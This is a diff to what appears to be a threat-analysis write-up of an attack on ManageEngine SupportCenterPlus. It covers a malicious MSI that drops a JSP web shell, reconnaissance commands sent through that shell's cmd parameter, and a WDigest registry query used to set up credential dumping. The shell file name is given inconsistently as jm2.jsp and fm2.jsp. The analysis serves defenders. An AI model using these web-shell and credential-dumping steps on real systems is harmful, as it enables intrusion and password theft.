@@ -15,7 +15,7 @@
 
 #### 2. Web Shell Deployment:
 - The Malicous msiexec.exe contains encoded web shell once `msiexec.exe /i Site24x7WindowsAgent.msi EDITA1=asdasd /qn` there is a webshell file `jm2.jsp` written to `C:\Program Files\ManageEngine\SupportCenterPlus\custom\login\fm2.jsp`, this way will allow the threat actor to maintain the access with no need to execute the exploit once again.
-- Now you have an access to the system through `http://<victim_ip:8080/custom/login/jm2.jsp`
+- Now you have an access to the system through `http://<victim_ip:8080/custom/login/jm2.jsp` then you can `Execute Commands` and `View and Download files`
   
   ![image](https://github.com/user-attachments/assets/65b4b314-1bf1-44cb-b281-8c5fa18156ac)
 
@@ -27,4 +27,10 @@
   https://server.example/custom/login/fm2.jsp?cmd=tasklist
   https://server.example/custom/login/fm2.jsp?cmd=wmic computersystem get domain
   ```
-#### 4. 
+#### 4. Credential Dumping
+- The Threat Actor Checked if the `WDigest` is Enabled because When WDigest is Enabled LSASS stores passwords in Plaintext.
+- Command Used:
+  ```
+  powershell.exe reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
+  ```
+  
